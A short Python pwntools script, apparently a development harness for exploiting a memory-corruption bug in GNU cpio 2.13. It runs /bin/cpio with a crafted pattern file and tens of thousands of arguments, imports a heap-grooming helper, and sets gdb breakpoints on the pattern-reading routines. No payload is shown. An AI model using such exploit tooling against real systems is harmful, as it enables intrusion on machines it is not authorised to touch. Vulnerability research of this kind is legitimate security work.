#!/usr/bin/env python3

from pwn import *
import fengshui

REAL = 1

PATTERN_FILE = "./patt"
CPIO_BINARY = "./cpio-2.13/src/cpio"
if REAL:
    CPIO_BINARY = "/bin/cpio"
BLOCK_SIZE = 16384 # 1<<20
NUM_PATTERNS = 0xc200

cpio_cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} -D /bin/bash" + " y"*NUM_PATTERNS

# open a gdb session
gdb_cmd = f"gdb --args"
if REAL:
    gdb_cmd = ""
p = process(gdb_cmd.split() + cpio_cmd.split())

if not REAL:
    # config breakpoints
    # p.sendline(b'break main')
    # p.sendline(b'break initialize_buffers')
    p.sendline(b'break read_pattern_file')
    # p.sendline(b'break process_copy_in')
    # p.sendline(b'break ds_fgetstr')
    # p.sendline(b'break query_rename')
    p.sendline(b'break breakpoint_fn')
    p.sendline(b'break ds_init')
    p.sendline(b'set disable-randomization on') # do 'off' to enable aslr
    # p.sendline(b'break xrealloc')
    # p.sendline(b'free')

    # config hooks
    p.sendline(b'define hook-next')
    p.sendline(b'vmmap')
    p.sendline(b'end')
    p.sendline(b'define hook-step')
    p.sendline(b'vmmap')
    p.sendline(b'end')
    p.sendline(b'define hook-continue')
    p.sendline(b'vmmap')
    p.sendline(b'end')
    p.sendline(b'r')
    p.sendline(b'c')
    p.sendline(b'c')
    # p.sendline(b'vmmap')
p.interactive()